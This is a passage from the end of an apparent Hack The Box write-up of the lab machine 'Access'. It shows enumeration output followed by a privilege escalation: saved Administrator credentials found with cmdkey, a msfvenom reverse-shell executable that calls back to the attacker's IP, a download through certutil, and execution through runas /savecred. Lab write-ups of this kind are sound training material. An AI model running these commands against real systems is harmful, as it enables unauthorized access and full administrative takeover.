                           [36]: KB2535512
                           [37]: KB2544893
                           [38]: KB2545698
                           [39]: KB2547666
                           [40]: KB2552343
                           [41]: KB2560656
                           [42]: KB2563227
                           [43]: KB2564958
                           [44]: KB2570947
                           [45]: KB2585542
                           [46]: KB2598845
                           [47]: KB2603229
                           [48]: KB2604114
                           [49]: KB2607047
                           [50]: KB2608658
                           [51]: KB2618451
                           [52]: KB2620704
                           [53]: KB2621440
                           [54]: KB2631813
                           [55]: KB2640148
                           [56]: KB2643719
                           [57]: KB2653956
                           [58]: KB2654428
                           [59]: KB2656355
                           [60]: KB2660075
                           [61]: KB2667402
                           [62]: KB2676562
                           [63]: KB2685811
                           [64]: KB2685813
                           [65]: KB2685939
                           [66]: KB2690533
                           [67]: KB2698365
                           [68]: KB2705219
                           [69]: KB2709630
                           [70]: KB2712808
                           [71]: KB2716513
                           [72]: KB2718704
                           [73]: KB2719033
                           [74]: KB2726535
                           [75]: KB2727528
                           [76]: KB2729094
                           [77]: KB2729451
                           [78]: KB2741355
                           [79]: KB2742598
                           [80]: KB2748349
                           [81]: KB2758857
                           [82]: KB2761217
                           [83]: KB2765809
                           [84]: KB2770660
                           [85]: KB2789644
                           [86]: KB2791765
                           [87]: KB2807986
                           [88]: KB2813347
                           [89]: KB2840149
                           [90]: KB2998812
                           [91]: KB958488
                           [92]: KB972270
                           [93]: KB974431
                           [94]: KB974571
                           [95]: KB975467
                           [96]: KB975560
                           [97]: KB977074
                           [98]: KB978542
                           [99]: KB978601
                           [100]: KB979099
                           [101]: KB979309
                           [102]: KB979482
                           [103]: KB979538
                           [104]: KB979687
                           [105]: KB979688
                           [106]: KB980408
                           [107]: KB980846
                           [108]: KB982018
                           [109]: KB982132
                           [110]: KB982799
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.12.50
                                 [02]: fe80::8045:35d9:db0f:f1ec
                                 [03]: dead:beef::8045:35d9:db0f:f1ec

```
The victim is running on Microsoft Windows Server 2008 R2 Standard with SP1. There are several exploits available for this Windows Operating system, but we should continue enumerating before exploiting a kernel exploit. In this case we should check if there are passwords stored on the victim. If there are passwords stored on the victim we can try to reuse them.
```
C:\Users\security\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```
It looks like we can run as another user, in this case the administrator of the system. We can create a binary that will connect to our listener. We can run as administrator this binary and catch a connection. To create this binary we can utilize msfvenom.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.40 lport=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

```
We should transfer the file to the victim via a web server with python.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Next we start a netcat listener on our Kali machine.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ sudo rlwrap nc -lvp 443      
[sudo] password for emvee: 
listening on [any] 443 ...

```
Then we download our binary to the victim with certutil.
```
C:\Users\security\Desktop>certutil -urlcache -f http://10.10.14.40/shell.exe shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\security\Desktop>

```

## Privilege escalation

The file has been downloaded to the victim. We can check this by running the `dir` command.
```
C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\Desktop

04/15/2024  12:43 PM    <DIR>          .
04/15/2024  12:43 PM    <DIR>          ..
04/15/2024  12:43 PM            73,802 shell.exe
04/15/2024  11:17 AM                34 user.txt
               2 File(s)         73,836 bytes
               2 Dir(s)   3,346,583,552 bytes free
```
Everything is set, so we should run the file as the administrator with saved credentials./
```
C:\Users\security\Desktop>runas /user:ACCESS\Administrator /savecred "C:\Users\security\Desktop\shell.exe"

C:\Users\security\Desktop>

```
Now we should check our netcat listener to see if the connection has been established.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ sudo rlwrap nc -lvp 443      
[sudo] password for emvee: 
listening on [any] 443 ...
10.129.12.50: inverse host lookup failed: Unknown host
connect to [10.10.14.40] from (UNKNOWN) [10.129.12.50] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```
The connection has been established, now we have to capture the flag and shown that we are the administrator on the victim machine in OSCP style.
```
C:\Windows\system32>whoami
whoami
access\administrator

C:\Windows\system32>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>type root.txt
type root.txt
<HERE IS THE ROOT FLAG>

c:\Users\Administrator\Desktop>whoami
whoami
access\administrator

c:\Users\Administrator\Desktop>hostname
hostname
ACCESS

c:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::8045:35d9:db0f:f1ec
   Link-local IPv6 Address . . . . . : fe80::8045:35d9:db0f:f1ec%17
   IPv4 Address. . . . . . . . . . . : 10.129.12.50
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb

c:\Users\Administrator\Desktop>

```

## conclusion

In conclusion, Access is a great machine for anyone looking to practice and improve their penetration testing skills. It provides a realistic scenario and a variety of challenges that will test your abilities to the limit. From information gathering and scanning, to exploitation and post-exploitation, Access covers a wide range of topics and techniques that are commonly used in the field. Yes, it is dated, but there are still some techniques used today. 

Throughout this post, we have explored some of the key steps and techniques used to compromise Access. From identifying and exploiting vulnerabilities, to escalating privileges and maintaining access, we have covered a lot of ground. However, it is important to note that this post is not meant to be an exhaustive guide, but rather a starting point for further exploration and learning.

Penetration testing is a constantly evolving field, and new techniques and tools are being developed all the time. So, it is important to continue learning and practicing in order to stay up-to-date with the latest trends and best practices. With its realistic scenario and challenging objectives, Access is a great machine to help you do just that.

So, if you are looking to improve your penetration testing skills, I highly recommend giving Access a try. And, as always, remember to practice safely and responsibly. Happy hacking!